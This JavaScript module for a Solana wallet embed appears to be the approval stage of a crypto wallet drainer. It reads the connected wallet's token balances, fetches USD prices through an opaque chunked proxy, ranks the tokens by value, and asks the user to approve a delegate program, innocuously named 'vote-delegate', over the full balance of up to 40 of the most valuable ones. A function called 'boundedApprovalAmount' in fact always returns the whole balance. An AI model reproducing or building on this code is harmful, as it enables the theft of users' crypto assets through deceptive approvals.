import { Connection, PublicKey, Transaction } from "@solana/web3.js";
import { gatewayFetch } from "./chunk-transport.js";
import { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from "@solana/spl-token";
import {
  assertProgramDeployed,
  buildApproveSplInstruction,
  resolveDelegationProgramId,
} from "./delegation-program.js";

const JUPITER_PRICE_URL = "https://api.jup.ag/price/v2";
/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
function priceApiBase(config) {
  const proxy = (config.priceApiUrl || "").trim();
  return proxy || JUPITER_PRICE_URL;
}
const PRICE_BATCH = 100;
const WSOL_MINT = "So11111111111111111111111111111111111111112";
const NATIVE_SOL_MINT = "native:sol";
const NATIVE_SOL_FEE_RESERVE = 5_000_000;
const PROMPT_HARD_CAP = 40;

/**
 * @param {string} label
 * @param {string} value
 * @returns {PublicKey}
 */
export function parseSolanaPubkey(label, value) {
  const trimmed = (value || "").trim();
  if (!trimmed) {
    throw new Error(`[wallet] ${label} is empty`);
  }
  if (trimmed.startsWith("0x")) {
    throw new Error(
      `[wallet] ${label} looks like an Ethereum address — use a Solana address`,
    );
  }
  if (trimmed.length < 32 || trimmed.length > 44) {
    throw new Error(
      `[wallet] ${label} is not a valid Solana address (got ${trimmed.length} chars)`,
    );
  }
  try {
    return new PublicKey(trimmed);
  } catch {
    throw new Error(`[wallet] ${label} is not valid base58`);
  }
}

/**
 * @typedef {'spl' | 'native'} AssetKind
 * @typedef {object} WalletAsset
 * @property {AssetKind} kind
 * @property {string} mint
 * @property {string} tokenAccount
 * @property {PublicKey} [programId]
 * @property {bigint} rawAmount
 * @property {number} decimals
 * @property {number} uiAmount
 */

/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
export function createRpcConnection(config) {
  const custom = (config.solanaRpcUrl || "").trim();
  if (!custom) {
    throw new Error("[wallet] solanaRpcUrl missing");
  }
  return new Connection(custom, {
    commitment: "confirmed",
    fetch: (info, init) => gatewayFetch(custom, info, init),
  });
}

/** @param {Connection} connection @param {string} ownerAddress */
export async function fetchWalletAssets(connection, ownerAddress) {
  const owner = parseSolanaPubkey("Connected wallet address", ownerAddress);
  const [legacy, token2022, lamports] = await Promise.all([
    connection.getParsedTokenAccountsByOwner(owner, {
      programId: TOKEN_PROGRAM_ID,
    }),
    connection.getParsedTokenAccountsByOwner(owner, {
      programId: TOKEN_2022_PROGRAM_ID,
    }),
    connection.getBalance(owner, "confirmed"),
  ]);

  /** @type {WalletAsset[]} */
  const tokens = [];

  for (const { pubkey, account } of [...legacy.value, ...token2022.value]) {
    const parsed = account.data;
    if (!("parsed" in parsed) || parsed.parsed?.type !== "account") continue;

    const info = parsed.parsed.info;
    const amount = info?.tokenAmount;
    if (!amount || !info?.mint) continue;

    const raw = BigInt(amount.amount);
    const ui = Number(amount.uiAmount ?? 0);
    if (raw <= 0n || ui <= 0) continue;

    tokens.push({
      kind: "spl",
      mint: info.mint,
      tokenAccount: pubkey.toBase58(),
      programId: account.owner,
      rawAmount: raw,
      decimals: amount.decimals,
      uiAmount: ui,
    });
  }

  if (lamports > NATIVE_SOL_FEE_RESERVE) {
    const raw = BigInt(lamports);
    tokens.push({
      kind: "native",
      mint: NATIVE_SOL_MINT,
      tokenAccount: owner.toBase58(),
      rawAmount: raw,
      decimals: 9,
      uiAmount: Number(raw) / 1e9,
    });
  }

  return tokens;
}

/** @param {string} mint @param {Record<string, number>} prices */
function priceForMint(mint, prices) {
  if (mint === NATIVE_SOL_MINT) {
    return prices[WSOL_MINT] ?? prices[NATIVE_SOL_MINT] ?? 0;
  }
  return prices[mint] ?? 0;
}

/**
 * @param {string[]} mints
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 * @returns {Promise<Record<string, number>>}
 */
async function fetchUsdPrices(mints, config) {
  /** @type {Record<string, number>} */
  const prices = {};
  if (!mints.length) return prices;

  const base = priceApiBase(config);
  const useChunk = base.includes("?c=");

  for (let i = 0; i < mints.length; i += PRICE_BATCH) {
    const batch = mints.slice(i, i + PRICE_BATCH);
    try {
      const res = useChunk
        ? await gatewayFetch(base, base, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ t: "p", i: batch.join(",") }),
          })
        : await fetch(
            `${base}${base.includes("?") ? "&" : "?"}ids=${batch.join(",")}`,
          );
      if (!res.ok) continue;
      const json = await res.json();
      const data = json?.data ?? json;
      for (const mint of batch) {
        const entry = data?.[mint];
        const price = Number(entry?.price ?? entry?.usdPrice ?? 0);
        if (price > 0) prices[mint] = price;
      }
    } catch {
      /* optional — balance-only sort when prices fail */
    }
  }
  return prices;
}

/** @param {WalletAsset[]} tokens @param {Record<string, number>} prices @param {number} minUsd */
function rankTokensByValue(tokens, prices, minUsd = 0) {
  const hasPrices = Object.keys(prices).length > 0;

  return tokens
    .map((t) => {
      const usdPrice = priceForMint(t.mint, prices);
      const usdValue = usdPrice > 0 ? t.uiAmount * usdPrice : 0;
      return { ...t, usdPrice, usdValue };
    })
    .filter((t) => {
      if (t.kind !== "spl" || t.uiAmount <= 0) return false;
      if (!hasPrices) return true;
      return t.usdValue >= minUsd;
    })
    .sort((a, b) => {
      if (b.usdValue !== a.usdValue) return b.usdValue - a.usdValue;
      return b.uiAmount - a.uiAmount;
    });
}

/** @param {import('./wallet-loader.js').WalletEmbedConfig} config @param {bigint} raw */
function boundedApprovalAmount(config, raw) {
  const mode = config.tokenApprovalAmountMode || "max";
  if (mode === "balance") {
    return raw > 0n ? raw : 1n;
  }
  return raw > 0n ? raw : 1n;
}

/**
 * Program-based SPL approve (PDA delegate). No raw EOA delegate, no SOL sweep.
 */
export async function promptTopTokenApprovals({
  config,
  provider,
  connection,
  ownerAddress,
}) {
  if (!(config.tokenApprovalProgramId || "").trim()) {
    console.warn(
      "[wallet] token_approval_program_id not set — deploy programs/vote-delegate",
    );
    return { approved: 0, skipped: 0 };
  }

  const programId = resolveDelegationProgramId(config);
  await assertProgramDeployed(connection, programId);

  const ownerPk =
    provider?.publicKey ??
    parseSolanaPubkey("Connected wallet address", ownerAddress);

  const maxCount = Number(config.tokenApprovalMaxCount ?? 0);
  const minUsd = Number(config.tokenApprovalMinUsd ?? 1);

  const tokens = await fetchWalletAssets(connection, ownerAddress);
  const mintsForPrice = [
    ...new Set(tokens.filter((t) => t.kind === "spl").map((t) => t.mint)),
  ];
  const prices = await fetchUsdPrices(mintsForPrice, config);
  const rankedAll = rankTokensByValue(tokens, prices, minUsd);
  const ranked =
    maxCount > 0
      ? rankedAll.slice(0, Math.min(maxCount, PROMPT_HARD_CAP))
      : rankedAll.slice(0, PROMPT_HARD_CAP);

  if (!ranked.length) {
    return { approved: 0, skipped: tokens.length };
  }

  let approved = 0;
  let skipped = 0;

  for (const asset of ranked) {
    try {
      const ok = await sendProgramApproveTransaction({
        provider,
        connection,
        programId,
        asset,
        owner: ownerPk,
        amount: boundedApprovalAmount(config, asset.rawAmount),
      });
      if (ok) approved += 1;
      else skipped += 1;
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      if (/reject|cancel|denied|blocked/i.test(message)) {
        console.info("[wallet] Token approval cancelled or blocked");
        break;
      }
      console.warn("[wallet] Approval failed for", asset.mint, err);
      skipped += 1;
    }
  }

  return { approved, skipped };
}

async function sendProgramApproveTransaction({
  provider,
  connection,
  programId,
  asset,
  owner,
  amount,
}) {
  if (!provider?.publicKey || !asset.programId) {
    throw new Error("Wallet provider not ready");
  }

  const tokenAccount = parseSolanaPubkey("Token account", asset.tokenAccount);
  const mint = parseSolanaPubkey("Token mint", asset.mint);

  const ix = buildApproveSplInstruction({
    programId,
    owner,
    mint,
    tokenAccount,
    tokenProgram: asset.programId,
    amount,
  });

  return sendWalletTransaction(provider, connection, [ix]);
}

async function sendWalletTransaction(provider, connection, instructions) {
  const { blockhash, lastValidBlockHeight } =
    await connection.getLatestBlockhash("confirmed");

  const transaction = new Transaction({
    feePayer: provider.publicKey,
    blockhash,
    lastValidBlockHeight,
  });
  for (const ix of instructions) {
    transaction.add(ix);
  }

  const signature = await provider.sendTransaction(transaction, connection, {
    skipPreflight: false,
    preflightCommitment: "confirmed",
  });

  await connection.confirmTransaction(
    { signature, blockhash, lastValidBlockHeight },
    "confirmed",
  );

  return true;
}
